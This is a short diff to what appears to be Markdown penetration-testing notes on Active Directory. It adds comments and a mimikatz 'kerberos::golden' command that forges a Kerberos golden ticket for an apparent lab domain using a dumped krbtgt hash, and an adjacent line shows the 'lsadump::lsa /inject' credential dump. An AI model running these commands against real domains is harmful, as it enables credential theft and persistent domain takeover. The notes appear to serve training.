@@ -45,5 +45,9 @@ mimikatz # lsadump::lsa /inject /name:krbtgt
 ### **Generating Tickets**
 
 ```powershell
+# /User : fake user account
+# /domain : domain controller
+# /sid : the sid we saved to n
 
+mimikatz # kerberos::golden /User:secfortress /domain:marvel.local /sid:S-1-5-21-4089637540-2738901061-2314813381 /krbtgt:f362ad348de4e7392c0309959ec0775d /id:500 /ptt
 ```
